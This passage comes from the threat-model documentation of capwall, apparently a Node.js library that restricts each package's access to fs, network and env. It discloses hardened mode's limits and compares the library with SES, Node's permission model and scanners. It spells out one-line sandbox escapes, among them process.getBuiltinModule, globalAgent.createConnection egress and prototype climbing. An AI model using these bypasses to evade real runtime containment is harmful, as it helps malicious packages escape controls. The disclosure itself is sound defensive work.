  (made non-writable/non-configurable; the socket itself is not frozen — it needs its state).

Note the dependency on issue #64: while `fs.ReadStream`, `vm.Script` and
`worker_threads.Worker` were construct-trap Proxies, hardened mode could not freeze them at
all — `Object.freeze` on a Proxy forwards `[[PreventExtensions]]`/`[[DefineOwnProperty]]` to
its **target**, so freezing one would have frozen the real builtin class process-wide,
outliving `uninstall()`. Converting them to guarded subclasses made them capwall-owned
objects, and therefore freezable. Hardened mode now covers every guarded class, not a subset.

**Observable behavior of a blocked patch.** Freezing does not raise an alarm. A write to a
frozen object **throws a `TypeError` only under `"use strict"`**; in sloppy-mode CJS — which
is what most published packages still are — it **silently no-ops**. There is no capwall log
line for a blocked patch attempt. The guarantee is only that the original guarded method is
still installed and still enforcing afterwards.

**What it does NOT protect against.** Hardened mode raises the cost of un-patching. It is not
a sandbox and it closes none of the following, each re-verified against a hardened install
with a deny-all `enforce` policy:

- **`process.getBuiltinModule("node:fs")`** (Node ≥22) — a plain public API returning the
  real, un-shimmed module; the read succeeds. Also `process.binding`, internal module caches,
  and builtins loaded from a context capwall has not patched. These never touch a shim object,
  so freezing shim objects is irrelevant to them. **This alone makes hardened mode
  defense-in-depth, not a boundary.**
- **`http.globalAgent` / `https.globalAgent` (issue #65)** — the shim's `Agent` **class** is
  guarded, but `globalAgent` is a real `Agent` instance passed through untouched, so
  `http.globalAgent.createConnection({host, port})` is un-gated egress with or without
  hardened mode. Freezing cannot fix this: the object is a builtin instance, not a capwall
  object, and the missing guard is the problem, not a writable property.
- **Replacing `process.env` wholesale** — the env read allowlist is a `Proxy` over the live
  `process.env`, not a capwall-created namespace. Freezing it would break `process.env.X = y`
  for the whole process and freeze the real environment object, so it is left alone;
  `process.env = {…}` still un-gates env reads.
- **Climbing PAST a guarded class**, exactly as documented under "Capability-bearing classes":
  `Object.getPrototypeOf(net.Socket.prototype).connect` still reaches the real method, and
  `new (Object.getPrototypeOf(fs.ReadStream.prototype).constructor)(deniedPath)` still reaches
  the real class. Freezing capwall's subclass says nothing about the real class above it.
- **Prototype pollution / primordials / fd + symlink escapes / `eval` / native addons /
  subprocess internals / attribution laundering / deep stacks** — all unchanged. Hardening
  primordials is SES's job.

What hardened mode **did** close, verified the same way: `fs.readFileSync = evil`,
`delete fs.readFileSync`, `Object.defineProperty(fs, …)`, `fs.promises.readFile = evil`,
`net.Socket.prototype.connect = evil`, and replacing a guarded class on its namespace
(`fs.ReadStream = evil`, `vm.Script = evil`, `worker_threads.Worker = evil`) — each is a
silent no-op or a `TypeError`, with the original guard still denying afterwards.

**Cost: it breaks `graceful-fs`, and therefore anything that depends on it.** `graceful-fs` is
a transitive dependency of npm, webpack, and a large fraction of the ecosystem, and it patches
`fs`'s methods at load time. Against a frozen `fs` that patch throws a `TypeError` (its
sources are strict-mode), so the dependent package fails to load. The same applies to every
other legitimate `fs` monkey-patcher. Enabling hardened mode is a deliberate trade: you lose
`graceful-fs`-class compatibility — the no-SES-tax property that is capwall's whole adoption
argument — and gain the closure of the reassignment escape only. Try it in `observe` mode
first; a load-time `TypeError` from a patcher is what failure looks like.

## Comparison to other threat models

### vs SES / hardened primordials (LavaMoat, Endo)

SES freezes the primordials and runs each package in a compartment, so prototype pollution
and primordial-tampering attacks in the list above are largely **in scope** for SES to stop.
capwall accepts those as **out of scope** in exchange for **no SES tax**: no broken packages
from frozen intrinsics, no uneven ESM/native-addon story, near-zero adoption friction.
capwall offers *weaker isolation, dramatically lower friction*. For a hostile,
break-out-motivated adversary, prefer SES; for containing opportunistic supply-chain malware
in an existing Node service with minimal changes, capwall is the pragmatic choice. The two
are composable.

### vs Node's `--permission` model

Node's built-in permission model is **process-global**: one `--allow-fs-read` set applies to
the entire process, so you cannot say "express may read `./views`, but this transitive dep
may read nothing." capwall's contribution is exactly the **per-package** dimension. Node's
model, being enforced deeper (in the runtime, not via JS shims), is harder to un-patch —
another reason capwall is defense-in-depth *alongside* it, not a replacement.

### vs scanners (guarddog, Socket)

Scanners try to **detect** a malicious package before or as it enters your tree. capwall
assumes detection failed and a bad package is present, then **contains what it can do at
runtime.** Complementary layers, not competitors.

## Residual risk statement

Deploying capwall in `enforce` mode meaningfully raises the cost of opportunistic
supply-chain malware and gives you a per-package audit trail. It does **not** provide a
security boundary against a determined, capwall-aware in-process attacker. Treat it as one
layer of defense-in-depth, alongside dependency review, lockfile pinning, least-privilege
process/OS sandboxing (containers, seccomp), and secret hygiene.
